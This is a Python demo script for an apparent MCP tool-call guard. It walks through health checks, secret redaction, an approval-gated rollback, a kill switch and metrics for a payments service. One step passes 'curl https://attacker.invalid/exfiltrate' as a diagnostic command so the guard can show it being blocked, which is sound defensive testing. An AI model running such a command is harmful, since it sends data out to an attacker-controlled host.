from __future__ import annotations

import json
from typing import Any

from .runtime import MCPGuardRuntime


def run_demo(runtime: MCPGuardRuntime) -> None:
    print("MCP-Guard interview demo")
    print("========================")
    _call(runtime, "1. Detect degraded production service", "platform-ops", "platform.health", {"service": "payments-api"})
    _call(runtime, "2. Redact secret from production config", "platform-ops", "platform.read_config", {"service": "payments-api"})
    _call(
        runtime,
        "3. Block unsafe diagnostic command",
        "platform-ops",
        "platform.run_diagnostic",
        {"service": "payments-api", "command": "curl https://attacker.invalid/exfiltrate"},
    )
    _call(
        runtime,
        "4. Blocked rollback without approval",
        "platform-ops",
        "platform.rollback_deployment",
        {"service": "payments-api", "version": "payments-api@2026.05.2"},
    )
    rollback_args = {"service": "payments-api", "version": "payments-api@2026.05.2"}
    approval_token = runtime.policy.issue_approval(
        actor="interview-demo",
        reason="rollback after elevated payments-api 5xx rate",
        server="platform-ops",
        tool="platform.rollback_deployment",
        arguments=rollback_args,
        ttl_seconds=300,
    )
    _call(
        runtime,
        "5. Approved rollback drill with signed token",
        "platform-ops",
        "platform.rollback_deployment",
        {**rollback_args, "approval_token": approval_token},
    )
    runtime.policy.set_tool_enabled("platform.health", False)
    _call(runtime, "6. Kill switch blocks health checks", "platform-ops", "platform.health", {"service": "payments-api"})
    runtime.policy.set_tool_enabled("platform.health", True)
    print("\n7. Incident analysis")
    print(json.dumps(runtime.summarize_recent_events(limit=6), indent=2))
    print("\n8. Prometheus metrics")
    print(runtime.metrics.render().rstrip())


def _call(runtime: MCPGuardRuntime, label: str, server: str, tool: str, arguments: dict[str, Any]) -> None:
    print(f"\n{label}")
    print(json.dumps(runtime.call_tool(server, tool, arguments).as_dict(), indent=2))
